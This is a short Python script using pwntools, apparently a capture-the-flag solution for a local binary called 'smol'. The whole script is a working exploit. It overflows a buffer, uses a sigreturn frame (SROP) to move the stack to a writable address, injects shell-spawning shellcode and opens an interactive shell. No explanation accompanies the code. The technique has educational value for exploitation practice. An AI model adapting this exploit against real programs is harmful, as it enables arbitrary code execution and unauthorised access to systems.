from pwn import *

writable = 0x402500
syscall = 0x40100a

e = ELF('smol')
context.binary = ELF('smol')

p = process('smol')

frame = SigreturnFrame()
frame.rsp = writable
frame.rip = e.symbols['main']

payload = b'A' * 0x10
payload += p64(e.symbols['main'])
payload += p64(syscall)
payload += bytes(frame)

p.send(payload)

p.send('A' * 0xf)

payload = b'A' * 0x10
payload += p64(writable + 0x8)
payload += asm(shellcraft.sh())

p.send(payload)

p.interactive()
